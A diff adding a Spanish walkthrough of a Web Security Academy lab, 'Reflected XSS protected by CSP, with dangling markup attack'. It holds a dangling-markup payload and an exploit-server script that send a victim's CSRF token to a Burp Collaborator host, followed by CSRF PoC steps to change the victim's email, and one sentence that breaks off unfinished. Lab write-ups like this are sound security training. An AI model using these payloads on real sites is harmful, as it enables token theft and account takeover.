@@ -812,7 +812,52 @@ Entonces debemos suponer que solo reemplazará los primeros **< >**. Entonces nu
 
 ## 28. Lab: Reflected XSS protected by CSP, with dangling markup attack
 
+```
+This lab uses CSP to mitigate against XSS attacks.
 
+To solve the lab, perform a dangling markup attack that steals a CSRF token and uses it to change the email address of another user. You can use the following credentials to log in for testing:
 
+Username: wiener
+Password: peter
+```
 
+Nos logeamos con las credenciales que nos dan, y cambiamos nuestro correo interceptando los paquetes en segundo plano. Podemos ver que si colocamos en el recurso **/email** el parametro **email** obtenemos que nos encontramos con una vulnerabilidad XSS.
+
+![](img63.png)
+
+Entonces usaremos el siguiente payload:
+
+```
+"><table background='//0gh5ibpa36x54ki12dydtmnfn6twhl.burpcollaborator.net?
+```
+
+Entonces en el exploit server usaremos la siguiente configuracion:
+
+```html
+<script>
+location='https://aceb1fd01e82d058800aa188005b00f1.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//0gh5ibpa36x54ki12dydtmnfn6twhl.burpcollaborator.net?';
+</script>
+```
+
+Luego hacemos clic en **store** y en **Deliver exploit to victim**. Luego revisamos en el burp intruden para ver si recolectamos el token.
+
+![](img64.png)
+
+Entonces, lo que haremos será ir de nuevo, a la seccion de cambiar la contraseña e interceptar el paquete.
+
+![](img65.png)
+
+Y luego le damos clic derecho en **Engagement tools** y luego en **Generate CSRF PoC**. Luego reemplazamos el token CSRF, luego en options clic en **Include auto-submit script**, clic en regenerate y en copy HTML.
+
+![](img66.png)
+
+Antes de ello no o
+
+Luego vamos al Exploit server, colocamos todo lo copiado en body, guardamos y enviamos a la victima.
+
+![](img67.png)
+
+![](img68.png)
+
+## 29. Lab: Reflected XSS protected by very strict CSP, with dangling markup attack
 
